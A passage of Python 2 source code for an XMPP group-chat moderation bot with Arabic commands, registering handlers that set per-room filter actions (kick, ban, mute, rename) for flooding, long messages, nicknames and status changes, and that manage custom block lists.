        if p in ['تعطيل'.decode('utf8'),'فصل'.decode('utf8'),'حجب'.decode('utf8'),'طرد'.decode('utf8'),'صامت'.decode('utf8'),'تغيير'.decode('utf8')]:
                MUC_FCON8[s[1]]["len"]=p
                write_file(MUC_FCONX8_FILE, str(MUC_FCON8))
                reply(t, s, s[2]+' : '+XFilterRE[8])
                load_banos444()
        else:
                if not p in ['تعطيل'.decode('utf8'),'فصل'.decode('utf8'),'حجب'.decode('utf8'),'طرد'.decode('utf8'),'صامت'.decode('utf8'),'تغيير'.decode('utf8')] and "len" not in ''.join(MUC_FCON8[s[1]].keys()):	
                        reply(t, s, s[2]+' : '+XFilterRE[4]%(FILTER_FLOOD))	
                else:
                        f = ''.join(MUC_FCON8[s[1]]["len"])		
                        reply(t, s, s[2]+' : '+XFilterRE[4]%(f if not f.isspace() else '..؟'))	
                        
def add_nickzz(t, s, p):
 if "off" in FILTER_Nick_AbD: reply(t, s, s[2]+' : '+"يرجى التحدث مع مصمم البوت حول هذا الامر")
 else:
        if not s[1] in GROUPCHATS:
                return
        if not s[1] in MUC_nickzz:
                MUC_nickzz[s[1]]={}
        if p in ['تعطيل'.decode('utf8'),'فصل'.decode('utf8'),'حجب'.decode('utf8'),'تغيير'.decode('utf8')]:
                MUC_nickzz[s[1]]["nickzz"]=p
                write_file(MUC_nickzz_FILE, str(MUC_nickzz))
                reply(t, s, s[2]+' : '+XFilterRE[8])
                load_banos444()
        else:
                if not p in ['تعطيل'.decode('utf8'),'فصل'.decode('utf8'),'حجب'.decode('utf8'),'تغيير'.decode('utf8')] and "nickzz" not in ''.join(MUC_nickzz[s[1]].keys()):	
                        reply(t, s, s[2]+' : '+XFilterRE[6]%(FILTER_Nick_AbD))	
                if not p in ['تعطيل'.decode('utf8'),'فصل'.decode('utf8'),'حجب'.decode('utf8'),'تغيير'.decode('utf8')]:
                        f = ''.join(MUC_nickzz[s[1]]["nickzz"])		
                        reply(t, s, s[2]+' : '+XFilterRE[6]%(f if not f.isspace() else '..؟'))						


def add_nickss(t, s, p):
 if "off" in FILTER_Nick_Rep: reply(t, s, s[2]+' : '+"يرجى التحدث مع مصمم البوت حول هذا الامر")
 else:
        if not s[1] in GROUPCHATS:
                return
        if not s[1] in MUC_nickss:
                MUC_nickss[s[1]]={}
        if p in ['تعطيل'.decode('utf8'),'فصل'.decode('utf8'),'حجب'.decode('utf8'),'تغيير'.decode('utf8')]:
                MUC_nickss[s[1]]["nickss"]=p
                write_file(MUC_nickss_FILE, str(MUC_nickss))
                reply(t, s, s[2]+' : '+XFilterRE[8])
                load_banos444()
        else:   
                if not p in ['تعطيل'.decode('utf8'),'فصل'.decode('utf8'),'حجب'.decode('utf8'),'تغيير'.decode('utf8')] and "nickss" not in ''.join(MUC_nickss[s[1]].keys()):	
                        reply(t, s, s[2]+' : '+XFilterRE[6]%(FILTER_Nick_Rep))		
                else:
                        f = ''.join(MUC_nickss[s[1]]["nickss"])		
                        reply(t, s, s[2]+' : '+XFilterRE[6]%(f if not f.isspace() else '..؟'))		


def add_cens9(t, s, p):
 if "off" in NEWMSG_REP: reply(t, s, s[2]+' : '+"يرجى التحدث مع مصمم البوت حول هذا الامر")
 else:
        if not s[1] in GROUPCHATS:
                return
        if not s[1] in MUC_MSG9:
                MUC_MSG9[s[1]]={}
        if p in ['تعطيل'.decode('utf8'),'فصل'.decode('utf8'),'حجب'.decode('utf8'),'طرد'.decode('utf8'),'صامت'.decode('utf8'),'تغيير'.decode('utf8')]:
                MUC_MSG9[s[1]]["cans"]=p
                write_file(MUC_MSG9_FILE, str(MUC_MSG9))
                reply(t, s, s[2]+' : '+XFilterRE[8])
                load_banos444()
        else:
                if not p in ['تعطيل'.decode('utf8'),'فصل'.decode('utf8'),'حجب'.decode('utf8'),'طرد'.decode('utf8'),'صامت'.decode('utf8'),'تغيير'.decode('utf8')] and "cans" not in ''.join(MUC_MSG9[s[1]].keys()):	
                        reply(t, s, s[2]+' : '+XFilterRE[4]%(NEWMSG_REP))	
                else:
                        f = ''.join(MUC_MSG9[s[1]]["cans"])		
                        reply(t, s, s[2]+' : '+XFilterRE[4]%(f if not f.isspace() else '..؟'))
			
def load_banos444():
        try:
                fp1 = file("plugins/BAN.py")
                exec fp1 in globals()
                fp1.close()
        except:
                raise
				
def MUC_NICK_NEW1(t, s, p):
 f=''
 if not s[1] in GROUPCHATS: return
 if not s[1] in MUC_NICK_NEW: MUC_NICK_NEW[s[1]]={} 
 if not p:
   if "تفعيل".decode('utf8') in (MUC_NICK_NEW[s[1]].keys()): 
    f=X_Filter_Change_Nick[1]
    reply(t, s, s[2]+' : '+f) 	
   else: 
    f = X_Filter_Change_Nick[2] 	
    reply(t, s, s[2]+' : '+f) 
 else: 
  if p in ['تفعيل'.decode('utf8')]:
   if 'تفعيل'.decode('utf8') not in MUC_NICK_NEW[s[1]].keys():
    MUC_NICK_NEW[s[1]]["تفعيل".decode('utf8')]={}
    write_file(MUC_NICK_NEW_FILE, str(MUC_NICK_NEW))
    reply(t, s, s[2]+' : '+X_Filter_Change_Nick[3])
   else: reply(t,s,X_Filter_Change_Nick[6])
  elif p in ['تعطيل'.decode('utf8')]:
   if 'تفعيل'.decode('utf8') in MUC_NICK_NEW[s[1]].keys(): 
    del MUC_NICK_NEW[s[1]]
    write_file(MUC_NICK_NEW_FILE, str(MUC_NICK_NEW))
    reply(t, s, s[2]+' : '+X_Filter_Change_Nick[4])
   else: reply(t,s,X_Filter_Change_Nick[7])
  else:     
   reply(t, s,X_Filter_Change_Nick[5])
   
register(MUC_NICK_NEW1, X_Filter_Change_Nick[0], 30)  


def add_AR_EN(t, s, p):
 if "no" in FILTER_GOOD_LANG: reply(t, s, s[2]+' : '+"يرجى التحدث مع مصمم البوت حول هذا الامر")
 else:
  f=''
  if not s[1] in GROUPCHATS: return
  if not p:
   try:f = ''.join(MUC_AR_EN[s[1]])	
   except: f = 'تعطيل'.decode('utf8')  
   reply(t, s, s[2]+' : '+X_Filter_Ar_En[1]%(f)) 
  else: 
   if p in ['تفعيل'.decode('utf8')]:
    if not s[1] in MUC_AR_EN:
     MUC_AR_EN[s[1]]={} 
    MUC_AR_EN[s[1]]=["تفعيل".decode('utf8')]
    write_file(MUC_AR_EN_FILE, str(MUC_AR_EN))
    reply(t, s, s[2]+' : '+X_Filter_Ar_En[2])
   elif p in ['تعطيل'.decode('utf8')]:
    if not s[1] in MUC_AR_EN:
     MUC_AR_EN[s[1]]={} 
    MUC_AR_EN[s[1]]=["تعطيل".decode('utf8')]
    write_file(MUC_AR_EN_FILE, str(MUC_AR_EN))
    reply(t, s, s[2]+' : '+X_Filter_Ar_En[3])
   else:
    try:f = ''.join(MUC_AR_EN[s[1]])	
    except: f = ' '     
    reply(t, s, s[2]+' : '+X_Filter_Ar_En[1]%(f))


NEW_REPXE=X_Order[1]
NEW_REPXE1 = X_Order[2]
NEW_REPXE3=X_Order[3]
   
def HND_LEN(t, s, p):
 f=''
 if not s[1] in GROUPCHATS: return
 if not p:
  reply(t, s, s[2]+' : '+NEW_REPXE3)  
 else: 
  sp=p.split()  
  if sp[0] ==XFilter[12]: #muc_filter_large
   if not "MaxMsg" in MUC_LIN_FILTER:
    MUC_LIN_FILTER["MaxMsg"]={}   
   if not s[1] in MUC_LIN_FILTER["MaxMsg"]: 
    MUC_LIN_FILTER["MaxMsg"][s[1]]={} 
   try:   	
      MUC_LIN_FILTER["MaxMsg"][s[1]]=int(sp[1])
      write_file(MUC_LIN_FILTER_FILE, str(MUC_LIN_FILTER))
      reply(t, s, s[2]+' : '+NEW_REPXE)
   except:   
    try: reply(t, s, s[2]+' : '+X_Order[4]%int("".join(str(MUC_LIN_FILTER["MaxMsg"][s[1]]))))	 
    except: reply(t, s, s[2]+' : '+X_Order[4]%str(MaXMsg)) 

  elif sp[0] ==XFilter[15]: #muc_filter_msg_space   
   if not "MaxSpace" in MUC_LIN_FILTER:
    MUC_LIN_FILTER["MaxSpace"]={}   
   if not s[1] in MUC_LIN_FILTER["MaxSpace"]:
    MUC_LIN_FILTER["MaxSpace"][s[1]]={}  	
   try:   	
      MUC_LIN_FILTER["MaxSpace"][s[1]]=int(sp[1])
      write_file(MUC_LIN_FILTER_FILE, str(MUC_LIN_FILTER))
      reply(t, s, s[2]+' : '+NEW_REPXE)
   except: 
    try: reply(t, s, s[2]+' : '+X_Order[4]%int("".join(str(MUC_LIN_FILTER["MaxSpace"][s[1]]))))	 
    except: reply(t, s, s[2]+' : '+X_Order[4]%str(SPACE))

   
  elif sp[0] ==XFilter[17]: #muc_filter_msg_flood  
   if not "MaxFlood" in MUC_LIN_FILTER:
    MUC_LIN_FILTER["MaxFlood"]={}   
   if not s[1] in MUC_LIN_FILTER["MaxFlood"]:
    MUC_LIN_FILTER["MaxFlood"][s[1]]={}  	
   try:   		
      MUC_LIN_FILTER["MaxFlood"][s[1]]=int(sp[1])
      write_file(MUC_LIN_FILTER_FILE, str(MUC_LIN_FILTER))
      reply(t, s, s[2]+' : '+NEW_REPXE)	  
   except: 
    try: reply(t, s, s[2]+' : '+X_Order[4]%int("".join(str(MUC_LIN_FILTER["MaxFlood"][s[1]]))))	 
    except: reply(t, s, s[2]+' : '+X_Order[4]%str(Flood)) 	   	 
	
  elif sp[0] ==XFilter[2]: #muc_filter_large_res 
   if not "MaxRes" in MUC_LIN_FILTER:
    MUC_LIN_FILTER["MaxRes"]={}   
   if not s[1] in MUC_LIN_FILTER["MaxRes"]:
    MUC_LIN_FILTER["MaxRes"][s[1]]={}  	
   try:   	
      MUC_LIN_FILTER["MaxRes"][s[1]]=int(sp[1])
      write_file(MUC_LIN_FILTER_FILE, str(MUC_LIN_FILTER))
      reply(t, s, s[2]+' : '+NEW_REPXE)	  
   except: 
    try: reply(t, s, s[2]+' : '+X_Order[4]%int("".join(str(MUC_LIN_FILTER["MaxRes"][s[1]]))))	 
    except: reply(t, s, s[2]+' : '+X_Order[4]%str(MAX_RES))  		
	
  elif sp[0] ==XFilter[6]: #muc_filter_large_nick
   if not "MaxNick" in MUC_LIN_FILTER:
    MUC_LIN_FILTER["MaxNick"]={}   
   if not s[1] in MUC_LIN_FILTER["MaxNick"]:
    MUC_LIN_FILTER["MaxNick"][s[1]]={}  	
   try:   	
      MUC_LIN_FILTER["MaxNick"][s[1]]=int(sp[1])
      write_file(MUC_LIN_FILTER_FILE, str(MUC_LIN_FILTER))
      reply(t, s, s[2]+' : '+NEW_REPXE)	  
   except: 
    try: reply(t, s, s[2]+' : '+X_Order[4]%int("".join(str(MUC_LIN_FILTER["MaxNick"][s[1]]))))	 
    except: reply(t, s, s[2]+' : '+X_Order[4]%str(MAXNICK)) 	

  elif sp[0] ==XFilter[3]: #muc_filter_large_status
   if not "MaxStatus" in MUC_LIN_FILTER:
    MUC_LIN_FILTER["MaxStatus"]={}   
   if not s[1] in MUC_LIN_FILTER["MaxStatus"]:
    MUC_LIN_FILTER["MaxStatus"][s[1]]={}  	
   try:   	
      MUC_LIN_FILTER["MaxStatus"][s[1]]=int(sp[1])
      write_file(MUC_LIN_FILTER_FILE, str(MUC_LIN_FILTER))
      reply(t, s, s[2]+' : '+NEW_REPXE)	  
   except: 
    try: reply(t, s, s[2]+' : '+X_Order[4]%int("".join(str(MUC_LIN_FILTER["MaxStatus"][s[1]]))))	 
    except: reply(t, s, s[2]+' : '+X_Order[4]%str(MAXSTATUS))    

  elif sp[0] =="flood_status": #muc_filter_flood_status
   if not "FloodStatus" in MUC_LIN_FILTER:
    MUC_LIN_FILTER["FloodStatus"]={}   
   if not s[1] in MUC_LIN_FILTER["FloodStatus"]:
    MUC_LIN_FILTER["FloodStatus"][s[1]]={}  	
   try:   	
      MUC_LIN_FILTER["FloodStatus"][s[1]]=int(sp[1])
      write_file(MUC_LIN_FILTER_FILE, str(MUC_LIN_FILTER))
      reply(t, s, s[2]+' : '+NEW_REPXE)	  
   except: 
    try: reply(t, s, s[2]+' : '+X_Order[4]%int("".join(str(MUC_LIN_FILTER["FloodStatus"][s[1]]))))	 
    except: reply(t, s, s[2]+' : '+X_Order[4]%str(MAXSTATUS_Flood))	
	

  elif sp[0] =="flood_nick": #muc_filter_flood_nicks
   if not "FloodNick" in MUC_LIN_FILTER:
    MUC_LIN_FILTER["FloodNick"]={}   
   if not s[1] in MUC_LIN_FILTER["FloodNick"]:
    MUC_LIN_FILTER["FloodNick"][s[1]]={}  	
   try:   		
      MUC_LIN_FILTER["FloodNick"][s[1]]=int(sp[1])
      write_file(MUC_LIN_FILTER_FILE, str(MUC_LIN_FILTER))
      reply(t, s, s[2]+' : '+NEW_REPXE)	  
   except: 
    try: reply(t, s, s[2]+' : '+X_Order[4]%int("".join(str(MUC_LIN_FILTER["FloodNick"][s[1]]))))	 
    except: reply(t, s, s[2]+' : '+X_Order[4]%str(MAXNICK_Flood))	
   
  else:   reply(t, s, s[2]+' : '+NEW_REPXE3)
   
register(HND_LEN, X_Order[0], 30)  
   
register(add_AR_EN, X_Filter_Ar_En[0], 30)    
register(add_cens9, XFilter[20], 30) 			 
register(add_nickss, XFilter[19], 30)          		
register(add_nickzz, XFilter[18], 30)            
register(MSG_NONE4, XFilter[14], 30)	
register(MSG_SPACE4, XFilter[15], 30)  
register(MUC_SPAM2e, XFilter[16], 30)   
register(add_flood, XFilter[17], 30)          			
register(FAST_JOIN, XFilter[13], 30)		
register(add_nickz, XFilter[0], 30)			
register(add_nickr, XFilter[1], 30)			
register(add_resx, XFilter[2], 30)		
register(add_statusx, XFilter[3], 30)	
register(add_statusr, XFilter[4], 30)	
register(add_statusz, XFilter[5], 30)			
register(add_nickx, XFilter[6], 30)				
register(add_speed, XFilter[7], 30)		
register(add_rep, XFilter[8], 30) 			
register(add_answer, XFilter[9], 30) 		
register(add_adb, XFilter[10], 30) 		
register(add_cens, XFilter[11], 30)  		
register(add_len, XFilter[12], 30)		

######################################################
######################################################

filter_show=GLobal_Filter[1]
oktap=GLobal_Filter[2]
tolsx1=GLobal_Filter[3]
tolsx2=GLobal_Filter[4]
tolsx3=GLobal_Filter[5]
tolsx4=GLobal_Filter[6]
ar_en_muc= GLobal_Filter[7]
global_filter_vew = GLobal_Filter[8]


def add_banosa1x4(t, s, p):
 f = ''
 if not s[1] in GROUPCHATS: return
 if s[1] not in smart:
  smart[s[1]]={} 
 if not p: 
  f="\n"+'\n'.join(smart[s[1]]) 
  if t in ['groupchat']: reply(t,s,s[2]+' : '+"تم ارسال البيانات اليك في الخاص") 
  reply('chat',s,f) 
 else:
  sp=p.split() 
  try:
    msgs=sp[1]
  except: msgs = s[2] 

  if not sp[0] in smart[s[1]].keys(): 
   smart[s[1]][sp[0]]={} 
   smart[s[1]][sp[0]]["حجب".decode('utf8')]={} 	 
   smart[s[1]][sp[0]]["حجب".decode('utf8')][msgs]={} 	
   write_file(smart_FILE, str(smart))     
   reply(t,s,s[2]+' : '+"تم")				
  else: 
   del smart[s[1]][sp[0]]	
   smart[s[1]][sp[0]]={}   
   smart[s[1]][sp[0]]["حجب".decode('utf8')]={} 	
   smart[s[1]][sp[0]]["حجب".decode('utf8')][msgs]={} 	
   write_file(smart_FILE, str(smart))     
   reply(t,s,s[2]+' : '+"تم تحديث الامر")	  
register(add_banosa1x4, XFilter[21], 30)
def add_banosa2x2(t, s, p):
 f = ''
 if not s[1] in GROUPCHATS: return
 if s[1] not in smart:
  smart[s[1]]={} 
 if not p: 
  f="\n"+'\n'.join(smart[s[1]]) 
  if t in ['groupchat']: reply(t,s,s[2]+' : '+"تم ارسال البيانات اليك في الخاص") 
  reply('chat',s,f) 
 else:
  sp=p.split() 
  if sp[0] in smart[s[1]].keys(): 
   del smart[s[1]][sp[0]]		
   write_file(smart_FILE, str(smart))     
   reply(t,s,s[2]+' : '+"تم حذف الامر")				
  else:   
   reply(t,s,s[2]+' : '+"غير موجود")	  
register(add_banosa2x2, XFilter[22], 30)
##all add

def add_banosa1x41(t, s, p):
 f = ''
 if not s[1] in GROUPCHATS: return
 if s[1] not in BADall:
  BADall[s[1]]={} 
 if not p: 
  f="\n"+'\n'.join(BADall[s[1]]) 
  if t in ['groupchat']: reply(t,s,s[2]+' : '+"تم ارسال البيانات اليك في الخاص") 
  reply('chat',s,f) 
 else:
  sp=p.split() 
  try:
    msgs=sp[1]
  except: msgs = s[2] 
 
  if not sp[0] in BADall[s[1]].keys(): 
   BADall[s[1]][sp[0]]={} 
   BADall[s[1]][sp[0]]["حجب".decode('utf8')]={} 	 
   BADall[s[1]][sp[0]]["حجب".decode('utf8')][msgs]={} 	
   write_file(BADall_FILE, str(BADall))    
   reply(t,s,s[2]+' : '+"ok")				
  else: 
   del BADall[s[1]][sp[0]]	
   BADall[s[1]][sp[0]]={}   
   BADall[s[1]][sp[0]]["حجب".decode('utf8')]={} 	
   BADall[s[1]][sp[0]]["حجب".decode('utf8')][msgs]={} 	
   write_file(BADall_FILE, str(BADall))     
   reply(t,s,s[2]+' : '+"ok1111")	  
register(add_banosa1x41, XFilter[23], 30)
def add_banosa2x21(t, s, p):
 f = ''
 if not s[1] in GROUPCHATS: return
 if s[1] not in BADall:
  BADall[s[1]]={} 
 if not p: 
  f="\n"+'\n'.join(BADall[s[1]]) 
  if t in ['groupchat']: reply(t,s,s[2]+' : '+"تم ارسال البيانات اليك في الخاص") 
  reply('chat',s,f) 
 else:
  sp=p.split() 
  if sp[0] in BADall[s[1]].keys(): 
   del BADall[s[1]][sp[0]]		
   write_file(BADall_FILE, str(BADall))     
   reply(t,s,s[2]+' : '+"تم الحذف")				
  else:   
   reply(t,s,s[2]+' : '+"غير موجود")	  
register(add_banosa2x21, XFilter[24], 30)

def melocy_filter_g(t, s, p):
 for x in GROUPCHATS:
  room=x  
 if not p: reply(t, s, s[2]+' : '+global_filter_vew)
 else: 
   sp=p.split() 
   order1=['تعطيل'.decode('utf8'),'فصل'.decode('utf8'),'حجب'.decode('utf8'),'طرد'.decode('utf8'),'صامت'.decode('utf8'),'تغيير'.decode('utf8')]
   order2=['تعطيل'.decode('utf8'),'فصل'.decode('utf8'),'حجب'.decode('utf8'),'تغيير'.decode('utf8')]   
   if sp[0] == XFilter[20]: 
    if " " in p:   
     if sp[1] in order1 :     
      new3(sp[1])	   	
      reply(t, s, s[2]+' : '+oktap) 
     else: reply(t, s, s[2]+' : '+tolsx1) 	
    else: reply(t, s, s[2]+' : '+tolsx1) 	 
   elif sp[0] == XFilter[19]:
    if " " in p:   
     if sp[1] in order2 :     
      new4(sp[1])	   	
      reply(t, s, s[2]+' : '+oktap) 
     else: reply(t, s, s[2]+' : '+tolsx2) 	
    else: reply(t, s, s[2]+' : '+tolsx2) 
   elif sp[0] == X_Filter_Ar_En[0]:###
    if " " in p:   
     if sp[1] in ['تفعيل'.decode('utf8'),'تعطيل'.decode('utf8')] :     
      new50(sp[1])	   	
      reply(t, s, s[2]+' : '+oktap) 
     else: reply(t, s, s[2]+' : '+ar_en_muc) 	
    else: reply(t, s, s[2]+' : '+ar_en_muc) 	##
   elif sp[0] == XFilter[18]:
    if " " in p:   
     if sp[1] in order2 :     
      new5(sp[1])	   	
      reply(t, s, s[2]+' : '+oktap) 
     else: reply(t, s, s[2]+' : '+tolsx2) 	
    else: reply(t, s, s[2]+' : '+tolsx2) 	
   elif sp[0] == XFilter[14]:
    if " " in p:   
     if sp[1] in order1 :     
      new6(sp[1])	   	
      reply(t, s, s[2]+' : '+oktap) 
     else: reply(t, s, s[2]+' : '+tolsx1) 	
    else: reply(t, s, s[2]+' : '+tolsx1) 	
   elif sp[0] == XFilter[15]:
    if " " in p:   
     if sp[1] in order1 :     
      new7(sp[1])	   	
      reply(t, s, s[2]+' : '+oktap) 
     else: reply(t, s, s[2]+' : '+tolsx1) 	
    else: reply(t, s, s[2]+' : '+tolsx1) 	
   elif sp[0] == XFilter[16]:
    if " " in p:   
     if sp[1] in order1 :     
      new8(sp[1])	   	
      reply(t, s, s[2]+' : '+oktap) 
     else: reply(t, s, s[2]+' : '+tolsx1) 	
    else: reply(t, s, s[2]+' : '+tolsx1) 	
   elif sp[0] == XFilter[17]:
    if " " in p:   
     if sp[1] in order1 :     
      new9(sp[1])	   	
      reply(t, s, s[2]+' : '+oktap) 
     else: reply(t, s, s[2]+' : '+tolsx1) 	
    else: reply(t, s, s[2]+' : '+tolsx1) 	
   elif sp[0] == XFilter[13]:
    if " " in p:   
     if sp[1] in ['تعطيل'.decode('utf8'),'فصل'.decode('utf8'),'حجب'.decode('utf8')] :     
      new10(sp[1])	   	
      reply(t, s, s[2]+' : '+oktap) 
     else: reply(t, s, s[2]+' : '+tolsx3) 	
    else: reply(t, s, s[2]+' : '+tolsx3) 	
   elif sp[0] == XFilter[0]:
    if " " in p:   
     if sp[1] in order2 :     
      new11(sp[1])	   	
      reply(t, s, s[2]+' : '+oktap) 
     else: reply(t, s, s[2]+' : '+tolsx2) 	
    else: reply(t, s, s[2]+' : '+tolsx2) 	
   elif sp[0] == XFilter[1]:
    if " " in p:   
     if sp[1] in order2 :     
      new12(sp[1])	   	
      reply(t, s, s[2]+' : '+oktap) 
     else: reply(t, s, s[2]+' : '+tolsx2) 	
    else: reply(t, s, s[2]+' : '+tolsx2) 	
   elif sp[0] == XFilter[2]:
    if " " in p:   
     if sp[1] in ['تعطيل'.decode('utf8'),'فصل'.decode('utf8'),'حجب'.decode('utf8')] :     
      new13(sp[1])	   	
      reply(t, s, s[2]+' : '+oktap) 
     else: reply(t, s, s[2]+' : '+tolsx3) 	
    else: reply(t, s, s[2]+' : '+tolsx3) 	
   elif sp[0] == XFilter[6]:
    if " " in p:   
     if sp[1] in order2 :     
      new14(sp[1])	   	
      reply(t, s, s[2]+' : '+oktap) 
     else: reply(t, s, s[2]+' : '+tolsx2) 	
    else: reply(t, s, s[2]+' : '+tolsx2) 	
   elif sp[0] == XFilter[3]:
    if " " in p:   
     if sp[1] in order2 :     
      new15(sp[1])	   	
      reply(t, s, s[2]+' : '+oktap) 
     else: reply(t, s, s[2]+' : '+tolsx2) 	
    else: reply(t, s, s[2]+' : '+tolsx2) 	
   elif sp[0] ==XFilter[4]:
    if " " in p:   
     if sp[1] in order2 :     
      new16(sp[1])	   	
      reply(t, s, s[2]+' : '+oktap) 
     else: reply(t, s, s[2]+' : '+tolsx2) 	
    else: reply(t, s, s[2]+' : '+tolsx2) 	
   elif sp[0] == XFilter[5]:
    if " " in p:   
     if sp[1] in order2 :     
      new17(sp[1])	   	
      reply(t, s, s[2]+' : '+oktap) 
     else: reply(t, s, s[2]+' : '+tolsx2) 	
    else: reply(t, s, s[2]+' : '+tolsx2) 	
   elif sp[0] ==XFilter[7]:
    if " " in p:   
     if sp[1] in ['تعطيل'.decode('utf8'),'فصل'.decode('utf8'),'حجب'.decode('utf8'),'طرد'.decode('utf8'),'صامت'.decode('utf8')] :     
      new18(sp[1])	   	
      reply(t, s, s[2]+' : '+oktap) 
     else: reply(t, s, s[2]+' : '+tolsx4) 	
    else: reply(t, s, s[2]+' : '+tolsx4) 	
   elif sp[0] == XFilter[8]:
    if " " in p:   
     if sp[1] in ['تعطيل'.decode('utf8'),'فصل'.decode('utf8'),'حجب'.decode('utf8'),'طرد'.decode('utf8'),'صامت'.decode('utf8')] :     
      new19(sp[1])	   	
      reply(t, s, s[2]+' : '+oktap) 
     else: reply(t, s, s[2]+' : '+tolsx4) 	
    else: reply(t, s, s[2]+' : '+tolsx4) 	
   elif sp[0] == XFilter[9]: 
    if " " in p:   
     if sp[1] in order1 :     
      new20(sp[1])	   	
      reply(t, s, s[2]+' : '+oktap) 
     else: reply(t, s, s[2]+' : '+tolsx1) 	
    else: reply(t, s, s[2]+' : '+tolsx1) 	
   elif sp[0] == XFilter[10]: 
    if " " in p:   
     if sp[1] in order1 :     
      new21(sp[1])	   	
      reply(t, s, s[2]+' : '+oktap) 
     else: reply(t, s, s[2]+' : '+tolsx1) 	
    else: reply(t, s, s[2]+' : '+tolsx1) 	
   elif sp[0] == XFilter[11]: 
    if " " in p:   
     if sp[1] in order1 :     
      new22(sp[1])	   	
      reply(t, s, s[2]+' : '+oktap) 
     else: reply(t, s, s[2]+' : '+tolsx1) 	
    else: reply(t, s, s[2]+' : '+tolsx1) 
   elif sp[0] == XFilter[12]: 
    if " " in p:   
     if sp[1] in order1 :     
      new23(sp[1])	   	
      reply(t, s, s[2]+' : '+oktap) 
     else: reply(t, s, s[2]+' : '+tolsx1) 	
    else: reply(t, s, s[2]+' : '+tolsx1)	
	
   elif sp[0] == filter_show and sp[1]==XFilter[12]: 
     rep=''
     for x in MUC_FCON:
      rep+=x+": "        
      rep+=MUC_FCON[x]['len']+"\n"  
     reply(t, s, s[2]+' : '+"\n"+rep)	
	 
   elif sp[0] == filter_show and sp[1]==XFilter[11]: 
     rep=''
     for x in MUC_MSG:
      rep+=x+": "        
      rep+=MUC_MSG[x]['cans']+"\n" 
     reply(t, s, s[2]+' : '+"\n"+rep)	
	 
   elif sp[0] == filter_show and sp[1]==XFilter[10]: 
     rep=''
     for x in MUC_adb:
      rep+=x+": "        
      rep+=MUC_adb[x]['adblock']+"\n"
  
     reply(t, s, s[2]+' : '+"\n"+rep)	

   elif sp[0] == filter_show and sp[1]==XFilter[9]: 
     rep=''
     for x in MUC_answer:
      rep+=x+": "        
      rep+=MUC_answer[x]['answer']+"\n"
  
     reply(t, s, s[2]+' : '+"\n"+rep)	 
	 
   elif sp[0] == filter_show and sp[1]==XFilter[8]: 
     rep=''
     for x in MUC_rep:
      rep+=x+": "        
      rep+=MUC_rep[x]['rep']+"\n"

     reply(t, s, s[2]+' : '+"\n"+rep)	 
	 
   elif sp[0] == filter_show and sp[1]==XFilter[7]: 
     rep=''
     for x in MUC_speed:
      rep+=x+": "        
      rep+=MUC_speed[x]['speed']+"\n"
  
     reply(t, s, s[2]+' : '+"\n"+rep)		

   elif sp[0] == filter_show and sp[1]==XFilter[5]: 
     rep=''
     for x in MUC_statusz:
      rep+=x+": "        
      rep+=MUC_statusz[x]['statusz']+"\n"
  
     reply(t, s, s[2]+' : '+"\n"+rep)	

   elif sp[0] == filter_show and sp[1]==XFilter[4]: 
     rep=''
     for x in MUC_statusr:
      rep+=x+": "        
      rep+=MUC_statusr[x]['statusr']+"\n" 
     reply(t, s, s[2]+' : '+"\n"+rep)	

   elif sp[0] == filter_show and sp[1]==XFilter[3]: 
     rep=''
     for x in MUC_status:
      rep+=x+": "        
      rep+=MUC_status[x]['status']+"\n"
 
     reply(t, s, s[2]+' : '+"\n"+rep)	
	 
   elif sp[0] == filter_show and sp[1]==XFilter[6]: 
     rep=''
     for x in MUC_nick:
      rep+=x+": "        
      rep+=MUC_nick[x]['nick']+"\n"  
     reply(t, s, s[2]+' : '+"\n"+rep)		
	 
   elif sp[0] == filter_show and sp[1]==XFilter[2]: 
     rep=''
     for x in MUC_res:
      rep+=x+": "        
      rep+=MUC_res[x]['res']+"\n"
 
     reply(t, s, s[2]+' : '+"\n"+rep)		
	 
   elif sp[0] == filter_show and sp[1]==XFilter[1]: 
     rep=''
     for x in MUC_nickr:
      rep+=x+": "        
      rep+=MUC_nickr[x]['nickr']+"\n"
  
     reply(t, s, s[2]+' : '+"\n"+rep)	
	 
   elif sp[0] == filter_show and sp[1]==XFilter[0]: 
     rep=''
     for x in MUC_nickz:
      rep+=x+": "        
      rep+=MUC_nickz[x]['nickz']+"\n"  
     reply(t, s, s[2]+' : '+"\n"+rep)		

   elif sp[0] == filter_show and sp[1]==XFilter[13]: 
     rep=''
     for x in FAST_JOIN:
      rep+=x+": "        
      rep+=FAST_JOIN[x]['JOIN']+"\n"
  
     reply(t, s, s[2]+' : '+"\n"+rep)

   elif sp[0] == filter_show and sp[1]==XFilter[17]: 
     rep=''
     for x in MUC_FCON8:
      rep+=x+": "        
      rep+=MUC_FCON8[x]['len']+"\n"
  
     reply(t, s, s[2]+' : '+"\n"+rep)	
	 
   elif sp[0] == filter_show and sp[1]==XFilter[16]: 
     rep=''
     for x in MUC_SPAM2:
      rep+=x+": "        
      rep+=MUC_SPAM2[x]['spam2']+"\n"
	  
     reply(t, s, s[2]+' : '+"\n"+rep)	
	 
   elif sp[0] == filter_show and sp[1]==XFilter[15]: 
     rep=''
     for x in SPACE_MSGX:
      rep+=x+": "        
      rep+=SPACE_MSGX[x]['space']+"\n"

     reply(t, s, s[2]+' : '+"\n"+rep)	 
	 
   elif sp[0] == filter_show and sp[1]==XFilter[14]: 
     rep=''
     for x in NONE_MSGXX:
      rep+=x+": "        
      rep+=NONE_MSGXX[x]['none']+"\n"
  
     reply(t, s, s[2]+' : '+"\n"+rep)	 
	 
   elif sp[0] == filter_show and sp[1]==XFilter[18]: 
     rep=''
     for x in MUC_nickzz:
      rep+=x+": "        
      rep+=MUC_nickzz[x]['nickzz']+"\n"  
     reply(t, s, s[2]+' : '+"\n"+rep)		
 
   elif sp[0] == filter_show and sp[1]==XFilter[20]: 
     rep=''
     for x in MUC_MSG9:
      rep+=x+": "        
      rep+=MUC_MSG9[x]['cans']+"\n"

     reply(t, s, s[2]+' : '+"\n"+rep)		

   elif sp[0] == filter_show and sp[1]==XFilter[19]: 
     rep=''
     for x in MUC_nickss:
      rep+=x+": "        
      rep+=MUC_nickss[x]['nickss']+"\n"
 
     reply(t, s, s[2]+' : '+"\n"+rep)	 
 	
   
   elif sp[0] == filter_show and sp[1]==X_Filter_Ar_En[0]: 
     rep=''
     for x in MUC_AR_EN:
      rep+=x+": "          
      rep+=str(MUC_AR_EN[x])+"\n"
     reply(t, s, s[2]+' : '+"\n"+rep)	 
   else: reply(t, s, s[2]+' : '+"\n"+global_filter_vew)   
register(melocy_filter_g, GLobal_Filter[0], 100)

def new50(p):
 for x in GROUPCHATS:
